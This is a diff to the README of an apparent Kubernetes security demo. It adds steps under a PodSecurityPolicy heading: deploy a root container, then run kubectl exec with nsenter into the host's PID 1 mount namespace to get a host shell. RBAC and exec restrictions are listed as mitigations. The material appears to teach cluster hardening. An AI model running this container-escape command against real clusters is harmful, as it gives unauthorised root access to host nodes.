@@ -30,10 +30,18 @@ kubectl get node
 ```
 
 ### Demo 1: PodSecurityPolicy
-- Apply k8s manifest and run
-- See credentials
+- Run root container
+```
+kubectl apply -f manifest/root/pod.yaml
+```
+
+- Enter root
+kubectl exec -it root-container -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"
+```
 
 - How to block
+  - RBAC
+  - exec
 
 ### Demo 2: Workload Identity
 - Apply k8s manifest
